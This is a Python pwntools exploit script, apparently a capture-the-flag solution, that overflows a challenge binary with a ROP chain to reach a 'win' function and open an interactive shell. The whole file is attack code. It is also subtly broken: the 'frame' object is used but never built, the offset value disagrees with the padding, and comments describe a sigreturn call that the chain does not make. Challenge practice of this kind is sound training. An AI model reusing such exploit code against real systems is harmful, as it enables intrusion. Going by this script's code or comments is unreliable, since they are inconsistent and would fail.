from pwn import *

# Load binary
elf = context.binary = ELF("./chall")

# Start process
p = process(elf.path)
# p = remote("unpwnable.challs.pascalctf.it",1338)

# Offsets
offset = 92  # Adjust if necessary
syscall_ret = 0x000000000041c4a6  # Correct syscall; ret gadget
bin_sh = 0x49b030  # Address of "/bin/sh" in memory
win = 0x0000000000402f65
ret = 0x000000000040101a
# Create ROP chain
rop = ROP(elf)
rop.raw(b"A" * 88)
rop.raw(ret)
rop.raw(win)  # Call syscall to trigger sigreturn

# Setup SROP frame


# Exploit steps
payload = rop.chain() + bytes(frame)
write("payload",payload)
p.sendline(b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa")  # First overflow
p.sendline(b"69")  # Pass menu check
p.sendline(rop.chain())  # Send payload
# Debugging output
print(rop.dump())
# Get interactive shell
p.interactive()
